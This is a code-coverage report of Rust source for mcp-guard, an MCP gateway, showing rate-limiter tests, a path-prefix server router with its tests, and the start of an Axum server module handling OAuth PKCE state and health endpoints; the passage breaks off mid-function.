  371|       |    #[test]
  372|      1|    fn test_check_allowed_backwards_compat() {
  373|      1|        let config = RateLimitConfig {
  374|      1|            enabled: true,
  375|      1|            requests_per_second: 1,
  376|      1|            burst_size: 1,
  377|      1|        };
  378|      1|        let service = RateLimitService::new(&config);
  379|       |
  380|       |        // check_allowed should return simple bool
  381|      1|        assert!(service.check_allowed("user", None));
  382|      1|        assert!(!service.check_allowed("user", None));
  383|      1|    }
  384|       |
  385|       |    /// Verify retry_after_secs is populated when rate limited
  386|       |    #[test]
  387|      1|    fn test_retry_after_populated() {
  388|      1|        let config = RateLimitConfig {
  389|      1|            enabled: true,
  390|      1|            requests_per_second: 1,
  391|      1|            burst_size: 1,
  392|      1|        };
  393|      1|        let service = RateLimitService::new(&config);
  394|       |
  395|       |        // Exhaust rate limit
  396|      1|        service.check("user", None);
  397|      1|        let result = service.check("user", None);
  398|       |
  399|      1|        assert!(!result.allowed);
  400|      1|        assert!(result.retry_after_secs.is_some());
  401|       |        // Should be at least 1 second
  402|      1|        assert!(result.retry_after_secs.unwrap() >= 1);
  403|      1|    }
  404|       |
  405|       |    /// Verify TTL cleanup removes expired entries
  406|       |    #[test]
  407|      1|    fn test_ttl_cleanup() {
  408|      1|        let config = RateLimitConfig {
  409|      1|            enabled: true,
  410|      1|            requests_per_second: 10,
  411|      1|            burst_size: 10,
  412|      1|        };
  413|       |        // Set TTL to 0 so entries are immediately expired
  414|      1|        let service = RateLimitService::new(&config).with_ttl(Duration::ZERO);
  415|       |
  416|       |        // Create entries for multiple users
  417|      1|        service.check("user_a", None);
  418|      1|        service.check("user_b", None);
  419|      1|        service.check("user_c", None);
  420|       |
  421|      1|        assert_eq!(service.tracked_identities(), 3);
  422|       |
  423|       |        // Cleanup should remove all expired entries
  424|      1|        service.cleanup_expired();
  425|       |
  426|      1|        assert_eq!(service.tracked_identities(), 0);
  427|      1|    }
  428|       |
  429|       |    /// Verify TTL cleanup preserves recently-accessed entries
  430|       |    #[test]
  431|      1|    fn test_ttl_preserves_active_entries() {
  432|      1|        let config = RateLimitConfig {
  433|      1|            enabled: true,
  434|      1|            requests_per_second: 10,
  435|      1|            burst_size: 10,
  436|      1|        };
  437|       |        // Set a longer TTL
  438|      1|        let service = RateLimitService::new(&config).with_ttl(Duration::from_secs(3600));
  439|       |
  440|       |        // Create entries for multiple users
  441|      1|        service.check("user_a", None);
  442|      1|        service.check("user_b", None);
  443|       |
  444|      1|        assert_eq!(service.tracked_identities(), 2);
  445|       |
  446|       |        // Cleanup should preserve entries that haven't expired
  447|      1|        service.cleanup_expired();
  448|       |
  449|      1|        assert_eq!(service.tracked_identities(), 2);
  450|      1|    }
  451|       |}

/home/austingreen/Documents/botzr/projects/mcp-guard/src/router/mod.rs:
    1|       |//! Multi-server routing for mcp-guard
    2|       |//!
    3|       |//! Routes requests to different upstream MCP servers based on path prefix.
    4|       |//! This enables organizations to run multiple MCP servers behind a single gateway.
    5|       |
    6|       |use std::collections::HashMap;
    7|       |use std::sync::Arc;
    8|       |
    9|       |use crate::config::{ServerRouteConfig, TransportType};
   10|       |use crate::transport::{HttpTransport, Message, SseTransport, StdioTransport, Transport, TransportError};
   11|       |
   12|       |/// Router error types
   13|       |#[derive(Debug, thiserror::Error)]
   14|       |pub enum RouterError {
   15|       |    #[error("No route found for path: {0}")]
   16|       |    NoRoute(String),
   17|       |
   18|       |    #[error("Failed to initialize transport for server '{0}': {1}")]
   19|       |    TransportInit(String, String),
   20|       |
   21|       |    #[error("Transport error: {0}")]
   22|       |    Transport(#[from] TransportError),
   23|       |}
   24|       |
   25|       |/// Server route with initialized transport
   26|       |pub struct ServerRoute {
   27|       |    /// Route configuration
   28|       |    pub config: ServerRouteConfig,
   29|       |    /// Initialized transport
   30|       |    pub transport: Arc<dyn Transport>,
   31|       |}
   32|       |
   33|       |/// Multi-server router that routes requests to different upstreams based on path
   34|       |pub struct ServerRouter {
   35|       |    /// Routes indexed by path prefix (sorted by specificity)
   36|       |    routes: Vec<ServerRoute>,
   37|       |    /// Default route (optional, used when no path prefix matches)
   38|       |    default_route: Option<ServerRoute>,
   39|       |}
   40|       |
   41|       |impl std::fmt::Debug for ServerRouter {
   42|      0|    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
   43|      0|        f.debug_struct("ServerRouter")
   44|      0|            .field("route_count", &self.routes.len())
   45|      0|            .field("has_default", &self.default_route.is_some())
   46|      0|            .finish()
   47|      0|    }
   48|       |}
   49|       |
   50|       |impl ServerRouter {
   51|       |    /// Create a new server router from configuration
   52|       |    ///
   53|       |    /// This performs SSRF validation on HTTP/SSE URLs. Use `new_unchecked` to bypass
   54|       |    /// SSRF validation for trusted configurations (e.g., in tests).
   55|      1|    pub async fn new(configs: Vec<ServerRouteConfig>) -> Result<Self, RouterError> {
   56|      1|        Self::new_internal(configs, true).await
   57|      1|    }
   58|       |
   59|       |    /// Create a new server router without SSRF validation
   60|       |    ///
   61|       |    /// # Safety
   62|       |    /// This bypasses SSRF protection. Only use when URLs are from a trusted source
   63|       |    /// (e.g., hardcoded in the application) or when connecting to localhost for testing.
   64|      1|    pub async fn new_unchecked(configs: Vec<ServerRouteConfig>) -> Result<Self, RouterError> {
   65|      1|        Self::new_internal(configs, false).await
   66|      1|    }
   67|       |
   68|       |    /// Internal constructor with configurable SSRF validation
   69|      2|    async fn new_internal(configs: Vec<ServerRouteConfig>, validate_ssrf: bool) -> Result<Self, RouterError> {
   70|      2|        let mut routes = Vec::new();
   71|       |
   72|      4|        for config in configs {
                          ^3
   73|      3|            let transport = Self::create_transport(&config, validate_ssrf).await?;
                              ^2                                                              ^1
   74|      2|            routes.push(ServerRoute {
   75|      2|                config,
   76|      2|                transport,
   77|      2|            });
   78|       |        }
   79|       |
   80|       |        // Sort routes by path prefix length (longer = more specific = higher priority)
   81|      1|        routes.sort_by(|a, b| b.config.path_prefix.len().cmp(&a.config.path_prefix.len()));
   82|       |
   83|      1|        Ok(Self {
   84|      1|            routes,
   85|      1|            default_route: None,
   86|      1|        })
   87|      2|    }
   88|       |
   89|       |    /// Create a transport from server route configuration
   90|      3|    async fn create_transport(config: &ServerRouteConfig, validate_ssrf: bool) -> Result<Arc<dyn Transport>, RouterError> {
   91|      3|        match config.transport {
   92|       |            TransportType::Stdio => {
   93|      0|                let command = config.command.as_ref().ok_or_else(|| {
   94|      0|                    RouterError::TransportInit(
   95|      0|                        config.name.clone(),
   96|      0|                        "stdio transport requires 'command'".to_string(),
   97|      0|                    )
   98|      0|                })?;
   99|      0|                let transport = StdioTransport::spawn(command, &config.args)
  100|      0|                    .await
  101|      0|                    .map_err(|e| RouterError::TransportInit(config.name.clone(), e.to_string()))?;
  102|      0|                Ok(Arc::new(transport))
  103|       |            }
  104|       |            TransportType::Http => {
  105|      3|                let url = config.url.as_ref().ok_or_else(|| {
                                                                          ^0
  106|      0|                    RouterError::TransportInit(
  107|      0|                        config.name.clone(),
  108|      0|                        "http transport requires 'url'".to_string(),
  109|      0|                    )
  110|      0|                })?;
  111|      3|                let transport = if validate_ssrf {
                                  ^2
  112|      1|                    HttpTransport::new(url.clone())
  113|      1|                        .map_err(|e| RouterError::TransportInit(config.name.clone(), e.to_string()))?
  114|       |                } else {
  115|      2|                    HttpTransport::new_unchecked(url.clone())
  116|       |                };
  117|      2|                Ok(Arc::new(transport))
  118|       |            }
  119|       |            TransportType::Sse => {
  120|      0|                let url = config.url.as_ref().ok_or_else(|| {
  121|      0|                    RouterError::TransportInit(
  122|      0|                        config.name.clone(),
  123|      0|                        "sse transport requires 'url'".to_string(),
  124|      0|                    )
  125|      0|                })?;
  126|      0|                let transport = if validate_ssrf {
  127|      0|                    SseTransport::connect(url.clone())
  128|      0|                        .await
  129|      0|                        .map_err(|e| RouterError::TransportInit(config.name.clone(), e.to_string()))?
  130|       |                } else {
  131|      0|                    SseTransport::connect_unchecked(url.clone())
  132|      0|                        .await
  133|      0|                        .map_err(|e| RouterError::TransportInit(config.name.clone(), e.to_string()))?
  134|       |                };
  135|      0|                Ok(Arc::new(transport))
  136|       |            }
  137|       |        }
  138|      3|    }
  139|       |
  140|       |    /// Set a default route for unmatched requests
  141|      0|    pub fn with_default(mut self, route: ServerRoute) -> Self {
  142|      0|        self.default_route = Some(route);
  143|      0|        self
  144|      0|    }
  145|       |
  146|       |    /// Find the route for a given path
  147|      5|    pub fn find_route(&self, path: &str) -> Option<&ServerRoute> {
  148|       |        // Try to match a specific route first
  149|      6|        for route in &self.routes {
                          ^3
  150|      3|            if path.starts_with(&route.config.path_prefix) {
  151|      2|                return Some(route);
  152|      1|            }
  153|       |        }
  154|       |
  155|       |        // Fall back to default route
  156|      3|        self.default_route.as_ref()
  157|      5|    }
  158|       |
  159|       |    /// Get the transport for a given path
  160|      0|    pub fn get_transport(&self, path: &str) -> Option<Arc<dyn Transport>> {
  161|      0|        self.find_route(path).map(|r| r.transport.clone())
  162|      0|    }
  163|       |
  164|       |    /// Get the route name for a given path (for logging/metrics)
  165|      0|    pub fn get_route_name(&self, path: &str) -> Option<&str> {
  166|      0|        self.find_route(path).map(|r| r.config.name.as_str())
  167|      0|    }
  168|       |
  169|       |    /// Transform the path if strip_prefix is enabled for the route
  170|      3|    pub fn transform_path(&self, path: &str) -> String {
  171|      3|        if let Some(route) = self.find_route(path) {
                                  ^2
  172|      2|            if route.config.strip_prefix {
  173|      1|                return path
  174|      1|                    .strip_prefix(&route.config.path_prefix)
  175|      1|                    .unwrap_or(path)
  176|      1|                    .to_string();
  177|      1|            }
  178|      1|        }
  179|      2|        path.to_string()
  180|      3|    }
  181|       |
  182|       |    /// Send a message to the appropriate server based on path
  183|      1|    pub async fn send(&self, path: &str, message: Message) -> Result<(), RouterError> {
  184|      1|        let route = self
                          ^0
  185|      1|            .find_route(path)
  186|      1|            .ok_or_else(|| RouterError::NoRoute(path.to_string()))?;
  187|       |
  188|      0|        route.transport.send(message).await.map_err(RouterError::from)
  189|      1|    }
  190|       |
  191|       |    /// Receive a message from the appropriate server based on path
  192|      1|    pub async fn receive(&self, path: &str) -> Result<Message, RouterError> {
  193|      1|        let route = self
                          ^0
  194|      1|            .find_route(path)
  195|      1|            .ok_or_else(|| RouterError::NoRoute(path.to_string()))?;
  196|       |
  197|      0|        route.transport.receive().await.map_err(RouterError::from)
  198|      1|    }
  199|       |
  200|       |    /// Get all route names for metrics/debugging
  201|      2|    pub fn route_names(&self) -> Vec<&str> {
  202|      4|        self.routes.iter().map(|r| r.config.name.as_str()).collect()
                      ^2                 ^2                              ^2
  203|      2|    }
  204|       |
  205|       |    /// Check if any routes are configured
  206|      1|    pub fn has_routes(&self) -> bool {
  207|      1|        !self.routes.is_empty() || self.default_route.is_some()
                                                 ^0                 ^0
  208|      1|    }
  209|       |
  210|       |    /// Get the number of configured routes
  211|      1|    pub fn route_count(&self) -> usize {
  212|      1|        self.routes.len()
  213|      1|    }
  214|       |}
  215|       |
  216|       |/// Route matcher for extracting server name from path
  217|       |pub struct RouteMatcher {
  218|       |    /// Map of path prefixes to server names
  219|       |    prefixes: HashMap<String, String>,
  220|       |}
  221|       |
  222|       |impl RouteMatcher {
  223|       |    /// Create a new route matcher from server routes
  224|      7|    pub fn new(routes: &[ServerRouteConfig]) -> Self {
  225|      7|        let mut prefixes = HashMap::new();
  226|     18|        for route in routes {
                          ^11
  227|     11|            prefixes.insert(route.path_prefix.clone(), route.name.clone());
  228|     11|        }
  229|      7|        Self { prefixes }
  230|      7|    }
  231|       |
  232|       |    /// Match a path to a server name
  233|     17|    pub fn match_path(&self, path: &str) -> Option<&str> {
  234|       |        // Find the longest matching prefix
  235|     17|        let mut best_match: Option<(&str, &String)> = None;
  236|     45|        for (prefix, name) in &self.prefixes {
                           ^28     ^28
  237|     28|            if path.starts_with(prefix)
  238|     16|                && best_match.is_none_or(|(best_prefix, _)| prefix.len() > best_prefix.len())
                                                                          ^3     ^3      ^3          ^3
  239|     16|            {
  240|     16|                best_match = Some((prefix, name));
  241|     16|            }
                          ^12
  242|       |        }
  243|     17|        best_match.map(|(_, name)| name.as_str())
                                                 ^13  ^13
  244|     17|    }
  245|       |}
  246|       |
  247|       |#[cfg(test)]
  248|       |mod tests {
  249|       |    use super::*;
  250|       |    use crate::config::TransportType;
  251|       |
  252|     13|    fn create_test_route(name: &str, path_prefix: &str, strip: bool) -> ServerRouteConfig {
  253|     13|        ServerRouteConfig {
  254|     13|            name: name.to_string(),
  255|     13|            path_prefix: path_prefix.to_string(),
  256|     13|            transport: TransportType::Http,
  257|     13|            command: None,
  258|     13|            args: vec![],
  259|     13|            url: Some("http://localhost:8080".to_string()),
  260|     13|            strip_prefix: strip,
  261|     13|        }
  262|     13|    }
  263|       |
  264|       |    #[test]
  265|      1|    fn test_route_matcher_exact() {
  266|      1|        let routes = vec![
  267|      1|            create_test_route("github", "/github", false),
  268|      1|            create_test_route("filesystem", "/filesystem", false),
  269|       |        ];
  270|      1|        let matcher = RouteMatcher::new(&routes);
  271|       |
  272|      1|        assert_eq!(matcher.match_path("/github/repos"), Some("github"));
  273|      1|        assert_eq!(matcher.match_path("/filesystem/read"), Some("filesystem"));
  274|      1|        assert_eq!(matcher.match_path("/unknown/path"), None);
  275|      1|    }
  276|       |
  277|       |    #[test]
  278|      1|    fn test_route_matcher_longest_prefix() {
  279|      1|        let routes = vec![
  280|      1|            create_test_route("api", "/api", false),
  281|      1|            create_test_route("api-v2", "/api/v2", false),
  282|       |        ];
  283|      1|        let matcher = RouteMatcher::new(&routes);
  284|       |
  285|       |        // Longer prefix should win
  286|      1|        assert_eq!(matcher.match_path("/api/v2/users"), Some("api-v2"));
  287|      1|        assert_eq!(matcher.match_path("/api/v1/users"), Some("api"));
  288|      1|    }
  289|       |
  290|       |    #[test]
  291|      1|    fn test_config_validation() {
  292|      1|        let valid = create_test_route("test", "/test", false);
  293|      1|        assert!(valid.validate().is_ok());
  294|       |
  295|      1|        let mut invalid = create_test_route("test", "no-slash", false);
  296|      1|        assert!(invalid.validate().is_err());
  297|       |
  298|      1|        invalid.path_prefix = "/test".to_string();
  299|      1|        invalid.name = "".to_string();
  300|      1|        assert!(invalid.validate().is_err());
  301|      1|    }
  302|       |
  303|       |    // ------------------------------------------------------------------------
  304|       |    // Additional RouteMatcher Tests
  305|       |    // ------------------------------------------------------------------------
  306|       |
  307|       |    #[test]
  308|      1|    fn test_route_matcher_empty() {
  309|      1|        let routes: Vec<ServerRouteConfig> = vec![];
  310|      1|        let matcher = RouteMatcher::new(&routes);
  311|      1|        assert_eq!(matcher.match_path("/any/path"), None);
  312|      1|    }
  313|       |
  314|       |    #[test]
  315|      1|    fn test_route_matcher_root_path() {
  316|      1|        let routes = vec![
  317|      1|            create_test_route("root", "/", false),
  318|      1|            create_test_route("api", "/api", false),
  319|       |        ];
  320|      1|        let matcher = RouteMatcher::new(&routes);
  321|       |
  322|       |        // More specific should win
  323|      1|        assert_eq!(matcher.match_path("/api/users"), Some("api"));
  324|       |        // Root should match everything else
  325|      1|        assert_eq!(matcher.match_path("/other"), Some("root"));
  326|      1|    }
  327|       |
  328|       |    #[test]
  329|      1|    fn test_route_matcher_exact_match() {
  330|      1|        let routes = vec![
  331|      1|            create_test_route("exact", "/exact", false),
  332|       |        ];
  333|      1|        let matcher = RouteMatcher::new(&routes);
  334|       |
  335|      1|        assert_eq!(matcher.match_path("/exact"), Some("exact"));
  336|      1|        assert_eq!(matcher.match_path("/exact/sub"), Some("exact"));
  337|       |        // Note: /exactnot starts with /exact, so it matches (prefix-based routing)
  338|      1|        assert_eq!(matcher.match_path("/exactnot"), Some("exact"));
  339|       |        // This one doesn't match
  340|      1|        assert_eq!(matcher.match_path("/other"), None);
  341|      1|    }
  342|       |
  343|       |    // ------------------------------------------------------------------------
  344|       |    // RouterError Tests
  345|       |    // ------------------------------------------------------------------------
  346|       |
  347|       |    #[test]
  348|      1|    fn test_router_error_no_route() {
  349|      1|        let err = RouterError::NoRoute("/unknown".to_string());
  350|      1|        let msg = format!("{}", err);
  351|      1|        assert!(msg.contains("/unknown"));
  352|      1|    }
  353|       |
  354|       |    #[test]
  355|      1|    fn test_router_error_transport_init() {
  356|      1|        let err = RouterError::TransportInit("server1".to_string(), "connection failed".to_string());
  357|      1|        let msg = format!("{}", err);
  358|      1|        assert!(msg.contains("server1"));
  359|      1|        assert!(msg.contains("connection failed"));
  360|      1|    }
  361|       |
  362|       |    #[test]
  363|      1|    fn test_router_error_from_transport() {
  364|      1|        let transport_err = TransportError::Timeout;
  365|      1|        let router_err: RouterError = transport_err.into();
  366|      1|        assert!(matches!(router_err, RouterError::Transport(_)));
                              ^0
  367|      1|    }
  368|       |
  369|       |    // ------------------------------------------------------------------------
  370|       |    // ServerRouteConfig Transport Type Tests
  371|       |    // ------------------------------------------------------------------------
  372|       |
  373|       |    #[test]
  374|      1|    fn test_config_validation_stdio_missing_command() {
  375|      1|        let mut config = ServerRouteConfig {
  376|      1|            name: "stdio".to_string(),
  377|      1|            path_prefix: "/stdio".to_string(),
  378|      1|            transport: TransportType::Stdio,
  379|      1|            command: None,
  380|      1|            args: vec![],
  381|      1|            url: None,
  382|      1|            strip_prefix: false,
  383|      1|        };
  384|      1|        assert!(config.validate().is_err());
  385|       |        
  386|      1|        config.command = Some("node".to_string());
  387|      1|        assert!(config.validate().is_ok());
  388|      1|    }
  389|       |
  390|       |    #[test]
  391|      1|    fn test_config_validation_http_missing_url() {
  392|      1|        let config = ServerRouteConfig {
  393|      1|            name: "http".to_string(),
  394|      1|            path_prefix: "/http".to_string(),
  395|      1|            transport: TransportType::Http,
  396|      1|            command: None,
  397|      1|            args: vec![],
  398|      1|            url: None,
  399|      1|            strip_prefix: false,
  400|      1|        };
  401|      1|        assert!(config.validate().is_err());
  402|      1|    }
  403|       |
  404|       |    #[test]
  405|      1|    fn test_config_validation_sse_missing_url() {
  406|      1|        let config = ServerRouteConfig {
  407|      1|            name: "sse".to_string(),
  408|      1|            path_prefix: "/sse".to_string(),
  409|      1|            transport: TransportType::Sse,
  410|      1|            command: None,
  411|      1|            args: vec![],
  412|      1|            url: None,
  413|      1|            strip_prefix: false,
  414|      1|        };
  415|      1|        assert!(config.validate().is_err());
  416|      1|    }
  417|       |
  418|       |    // ------------------------------------------------------------------------
  419|       |    // Additional Coverage Tests
  420|       |    // ------------------------------------------------------------------------
  421|       |
  422|       |    #[test]
  423|      1|    fn test_router_new_validation() {
  424|       |        // Test with invalid URL scheme to ensure validation runs
  425|      1|        let invalid_config = ServerRouteConfig {
  426|      1|            name: "invalid".to_string(),
  427|      1|            path_prefix: "/invalid".to_string(),
  428|      1|            transport: TransportType::Http,
  429|      1|            command: None,
  430|      1|            args: vec![],
  431|      1|            url: Some("not-a-url".to_string()),
  432|      1|            strip_prefix: false,
  433|      1|        };
  434|       |        
  435|      1|        let result = tokio::runtime::Runtime::new().unwrap().block_on(ServerRouter::new(vec![invalid_config]));
  436|      1|        assert!(result.is_err());
  437|      1|        assert!(matches!(result.unwrap_err(), RouterError::TransportInit(_, _)));
                              ^0
  438|      1|    }
  439|       |
  440|       |    #[test]
  441|      1|    fn test_router_send_no_route() {
  442|      1|        let router = ServerRouter {
  443|      1|            routes: vec![],
  444|      1|            default_route: None,
  445|      1|        };
  446|       |
  447|      1|        let test_message = Message::request(1, "ping", None);
  448|      1|        let result = tokio::runtime::Runtime::new().unwrap().block_on(
  449|      1|            router.send("/unknown", test_message)
  450|       |        );
  451|      1|        assert!(matches!(result, Err(RouterError::NoRoute(_))));
                              ^0
  452|      1|    }
  453|       |
  454|       |    #[test]
  455|      1|    fn test_router_receive_no_route() {
  456|      1|        let router = ServerRouter {
  457|      1|            routes: vec![],
  458|      1|            default_route: None,
  459|      1|        };
  460|       |
  461|      1|        let result = tokio::runtime::Runtime::new().unwrap().block_on(
  462|      1|            router.receive("/unknown")
  463|       |        );
  464|      1|        assert!(matches!(result, Err(RouterError::NoRoute(_))));
                              ^0
  465|      1|    }
  466|       |    
  467|       |    #[test]
  468|      1|    fn test_router_transform_path() {
  469|       |        use crate::mocks::MockTransport;
  470|      1|        let mut config = create_test_route("strip", "/strip", true);
  471|      1|        config.strip_prefix = true;
  472|       |        
  473|      1|        let router = ServerRouter {
  474|      1|            routes: vec![ServerRoute {
  475|      1|                config: config.clone(),
  476|      1|                transport: Arc::new(MockTransport::new()), 
  477|      1|            }],
  478|      1|            default_route: None,
  479|      1|        };
  480|       |        
  481|       |        // Should strip prefix
  482|      1|        assert_eq!(router.transform_path("/strip/foo"), "/foo");
  483|       |        
  484|       |        // Should return original if no match
  485|      1|        assert_eq!(router.transform_path("/other/foo"), "/other/foo");
  486|       |        
  487|       |        // Should return original if strip_prefix is false
  488|      1|        let config_no_strip = create_test_route("no-strip", "/no-strip", false);
  489|      1|        let router_no_strip = ServerRouter {
  490|      1|            routes: vec![ServerRoute {
  491|      1|                config: config_no_strip,
  492|      1|                transport: Arc::new(MockTransport::new()),
  493|      1|            }],
  494|      1|            default_route: None,
  495|      1|        };
  496|      1|        assert_eq!(router_no_strip.transform_path("/no-strip/foo"), "/no-strip/foo");
  497|      1|    }
  498|       |
  499|       |    #[test]
  500|      1|    fn test_router_route_count() {
  501|       |        use crate::mocks::MockTransport;
  502|      1|        let router = ServerRouter {
  503|      1|            routes: vec![
  504|      1|                ServerRoute {
  505|      1|                    config: create_test_route("s1", "/s1", false),
  506|      1|                    transport: Arc::new(MockTransport::new()),
  507|      1|                },
  508|      1|                ServerRoute {
  509|      1|                    config: create_test_route("s2", "/s2", false),
  510|      1|                    transport: Arc::new(MockTransport::new()),
  511|      1|                }
  512|      1|            ],
  513|      1|            default_route: None,
  514|      1|        };
  515|       |        
  516|      1|        assert_eq!(router.route_count(), 2);
  517|      1|        assert!(router.has_routes());
  518|      1|        assert_eq!(router.route_names(), vec!["s1", "s2"]);
  519|      1|    }
  520|       |}

/home/austingreen/Documents/botzr/projects/mcp-guard/src/server/mod.rs:
    1|       |//! Axum server and middleware for mcp-guard
    2|       |
    3|       |use axum::{
    4|       |    body::Body,
    5|       |    extract::{ConnectInfo, Query, State},
    6|       |    http::{header, HeaderMap, HeaderName, HeaderValue, Request, StatusCode},
    7|       |    middleware::{self, Next},
    8|       |    response::{IntoResponse, Redirect, Response},
    9|       |    routing::{get, post},
   10|       |    Json, Router,
   11|       |};
   12|       |use dashmap::DashMap;
   13|       |use metrics_exporter_prometheus::PrometheusHandle;
   14|       |use opentelemetry::propagation::TextMapPropagator;
   15|       |use opentelemetry_sdk::propagation::TraceContextPropagator;
   16|       |use std::sync::Arc;
   17|       |use std::time::{Duration, Instant};
   18|       |use tokio::sync::RwLock;
   19|       |use tower_http::trace::TraceLayer;
   20|       |use tracing_opentelemetry::OpenTelemetrySpanExt;
   21|       |
   22|       |// ============================================================================
   23|       |// Constants
   24|       |// ============================================================================
   25|       |
   26|       |/// OAuth state expiry time for PKCE flow.
   27|       |/// 10 minutes allows users time to complete the OAuth flow (login, consent)
   28|       |/// while limiting the window for state token reuse attacks.
   29|       |const OAUTH_STATE_EXPIRY_SECS: u64 = 600;
   30|       |
   31|       |/// Maximum number of pending OAuth states to prevent DoS attacks.
   32|       |/// An attacker flooding /oauth/authorize could cause memory exhaustion without this limit.
   33|       |/// 10,000 concurrent OAuth flows is generous for legitimate use but prevents resource exhaustion.
   34|       |const MAX_PENDING_OAUTH_STATES: usize = 10_000;
   35|       |
   36|       |use crate::audit::AuditLogger;
   37|       |use crate::auth::{AuthProvider, ClientCertInfo, Identity, MtlsAuthProvider, OAuthAuthProvider};
   38|       |use crate::authz::{filter_tools_list_response, is_tools_list_request};
   39|       |use crate::config::Config;
   40|       |use crate::observability::{record_auth, record_rate_limit, record_request, set_active_identities};
   41|       |use crate::rate_limit::RateLimitService;
   42|       |use crate::router::ServerRouter;
   43|       |use crate::transport::{Message, Transport};
   44|       |use std::net::IpAddr;
   45|       |
   46|       |/// PKCE state entry for OAuth flow
   47|       |///
   48|       |/// SECURITY: Includes client IP binding to prevent state fixation attacks.
   49|       |/// The client IP that initiated the OAuth flow must match the callback IP.
   50|       |pub struct PkceState {
   51|       |    /// PKCE code verifier
   52|       |    pub code_verifier: String,
   53|       |    /// When the state was created
   54|       |    pub created_at: Instant,
   55|       |    /// Client IP that initiated the OAuth flow (for binding validation)
   56|       |    pub client_ip: IpAddr,
   57|       |}
   58|       |
   59|       |/// OAuth state storage (state -> PKCE verifier)
   60|       |pub type OAuthStateStore = Arc<DashMap<String, PkceState>>;
   61|       |
   62|       |/// Create a new OAuth state store
   63|     17|pub fn new_oauth_state_store() -> OAuthStateStore {
   64|     17|    Arc::new(DashMap::new())
   65|     17|}
   66|       |
   67|       |/// Application state shared across all request handlers
   68|       |///
   69|       |/// This struct contains all the shared resources needed to process MCP requests,
   70|       |/// including authentication, rate limiting, transport connections, and metrics.
   71|       |pub struct AppState {
   72|       |    /// Loaded configuration (immutable after server start)
   73|       |    pub config: Config,
   74|       |    /// Primary authentication provider (may be MultiProvider for fallback auth)
   75|       |    pub auth_provider: Arc<dyn AuthProvider>,
   76|       |    /// Per-identity rate limiter with token bucket algorithm
   77|       |    pub rate_limiter: RateLimitService,
   78|       |    /// Audit logger for security event tracking
   79|       |    pub audit_logger: Arc<AuditLogger>,
   80|       |    /// Transport for single-server mode; None when using multi-server routing
   81|       |    pub transport: Option<Arc<dyn Transport>>,
   82|       |    /// Router for multi-server mode; None when using single-server mode
   83|       |    pub router: Option<Arc<ServerRouter>>,
   84|       |    /// Prometheus metrics handle for rendering /metrics endpoint
   85|       |    pub metrics_handle: PrometheusHandle,
   86|       |    /// OAuth provider for authorization code flow with PKCE (optional)
   87|       |    pub oauth_provider: Option<Arc<OAuthAuthProvider>>,
   88|       |    /// PKCE state storage mapping state tokens to code verifiers
   89|       |    pub oauth_state_store: OAuthStateStore,
   90|       |    /// Server startup timestamp for calculating uptime in /health
   91|       |    pub started_at: Instant,
   92|       |    /// Readiness flag for /ready endpoint (false until transport initialized)
   93|       |    pub ready: Arc<RwLock<bool>>,
   94|       |    /// mTLS provider for client certificate auth via reverse proxy headers
   95|       |    pub mtls_provider: Option<Arc<MtlsAuthProvider>>,
   96|       |}
   97|       |
   98|       |/// Health check response (detailed)
   99|       |#[derive(serde::Serialize)]
  100|       |struct HealthResponse {
  101|       |    status: &'static str,
  102|       |    version: &'static str,
  103|       |    uptime_secs: u64,
  104|       |}
  105|       |
  106|       |/// Liveness check response (minimal)
  107|       |#[derive(serde::Serialize)]
  108|       |struct LiveResponse {
  109|       |    status: &'static str,
  110|       |}
  111|       |
  112|       |/// Readiness check response
  113|       |#[derive(serde::Serialize)]
  114|       |struct ReadyResponse {
  115|       |    ready: bool,
  116|       |    version: &'static str,
  117|       |    #[serde(skip_serializing_if = "Option::is_none")]
  118|       |    reason: Option<String>,
  119|       |}
  120|       |
  121|       |/// Health check handler - returns detailed status
  122|      2|async fn health(State(state): State<Arc<AppState>>) -> Json<HealthResponse> {
  123|      2|    let uptime = state.started_at.elapsed();
  124|      2|    Json(HealthResponse {
  125|      2|        status: "healthy",
  126|      2|        version: env!("CARGO_PKG_VERSION"),
  127|      2|        uptime_secs: uptime.as_secs(),
  128|      2|    })
  129|      2|}
  130|       |
  131|       |/// Liveness check handler - minimal check for container orchestration
  132|       |/// Returns 200 if the server is running
  133|      1|async fn live() -> Json<LiveResponse> {
  134|      1|    Json(LiveResponse { status: "alive" })
  135|      1|}
  136|       |
  137|       |/// Readiness check handler - checks if the server can handle requests
  138|       |/// Returns 200 if ready, 503 if not ready
  139|      2|async fn ready(State(state): State<Arc<AppState>>) -> impl IntoResponse {
  140|      2|    let is_ready = *state.ready.read().await;
  141|       |
  142|      2|    if is_ready {
  143|      1|        (
  144|      1|            StatusCode::OK,
  145|      1|            Json(ReadyResponse {
  146|      1|                ready: true,
  147|      1|                version: env!("CARGO_PKG_VERSION"),
  148|      1|                reason: None,
  149|      1|            }),
  150|      1|        )
  151|       |    } else {
  152|      1|        (
  153|      1|            StatusCode::SERVICE_UNAVAILABLE,
  154|      1|            Json(ReadyResponse {
  155|      1|                ready: false,
  156|      1|                version: env!("CARGO_PKG_VERSION"),
  157|      1|                reason: Some("Transport not initialized".to_string()),
  158|      1|            }),
  159|      1|        )
  160|       |    }
  161|      2|}
  162|       |
  163|       |/// Metrics endpoint handler - returns Prometheus format metrics
  164|      0|async fn metrics_handler(State(state): State<Arc<AppState>>) -> impl IntoResponse {
  165|       |    // Update the active identities gauge before rendering
  166|      0|    set_active_identities(state.rate_limiter.tracked_identities());
  167|       |
  168|      0|    let metrics = state.metrics_handle.render();
  169|      0|    (
  170|      0|        StatusCode::OK,
  171|      0|        [(header::CONTENT_TYPE, "text/plain; version=0.0.4; charset=utf-8")],
  172|      0|        metrics,
  173|      0|    )
  174|      0|}
  175|       |
  176|       |/// MCP message handler with tools/list filtering (FR-AUTHZ-03)
  177|       |/// Used for single-server mode
  178|      0|async fn handle_mcp_message(
  179|      0|    State(state): State<Arc<AppState>>,
  180|      0|    axum::Extension(identity): axum::Extension<Identity>,
  181|      0|    Json(message): Json<Message>,
  182|      0|) -> Result<Json<Message>, AppError> {
  183|       |    // Get the transport (single-server mode)
  184|      0|    let transport = state.transport.as_ref().ok_or_else(|| {
  185|      0|        AppError::internal("No transport configured (use multi-server routing?)")
  186|      0|    })?;
  187|       |
  188|       |    // Check if this is a tools/list request (for later filtering)
  189|      0|    let is_tools_list = is_tools_list_request(&message);
  190|       |
  191|       |    // Forward to upstream transport
  192|      0|    transport.send(message).await?;
  193|       |
  194|       |    // Wait for response
  195|      0|    let response = transport.receive().await?;
  196|       |
  197|       |    // Filter tools/list response to only show authorized tools
  198|      0|    let response = if is_tools_list {
